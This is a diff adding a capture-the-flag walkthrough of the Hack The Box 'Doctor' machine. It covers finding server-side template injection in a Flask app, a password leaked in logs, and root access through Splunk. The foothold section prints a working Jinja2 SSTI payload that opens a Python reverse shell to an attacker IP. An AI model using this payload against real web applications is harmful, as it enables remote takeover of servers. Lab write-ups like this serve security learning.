@@ -80,10 +80,61 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ![](./images/2.png)
 
-
 ## Foothold
+- We have an email `info@doctors.htb`
+  - If we add `doctors.htb` to `/etc/hosts` file and visit it, we are redirected to `/login?next=%2F`
+  - Which is served under `Werkzeug/1.0.1 Python/3.8.2`
 
+![](./images/3.png)
+![](./images/4.png)
+
+- We can create an account and check what's inside
+  - We can create posts
+  - If we check the source, we have `/archive`
+
+![](./images/5.png)
+![](./images/6.png)
+![](./images/7.png)
+![](./images/8.png)
+![](./images/9.png)
+
+- I tested for `sqli` but found nothing
+  - We might have [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), so let's test it
+  - I started with basic payloads from the post
+  - There was nothing on the `post` page, but if we visit `/archive` page we see the results
+
+![](./images/10.png)
+![](./images/11.png)
+![](./images/12.png)
+
+- Let's get reverse shell
+  - I used payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
+    - `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.12\",6666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`
+  - Launch a listener, create a new post and visit the `/archive`
+
+![](./images/13.png)
+![](./images/14.png)
+![](./images/15.png)
 
 ## User
+- Let's run `linpeas`
+  - We find an interesting entry in logs `POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password`
+  - It happens to be `shaun`'s password
+  
+![](./images/16.png)
+![](./images/17.png)
+
 
 ## Root
+- `linpeas` found nothing
+  - Then I started enumerating `splunk`
+    - `searchsploit` has nothing 
+  - Found an interesting repo [SplunkWhisperer2s](https://github.com/cnotin/SplunkWhisperer2)
+  - Let's test it
+
+![](./images/18.png)
+
+- Well, it works
+  - Let's get our root
+
+![](./images/18.png)
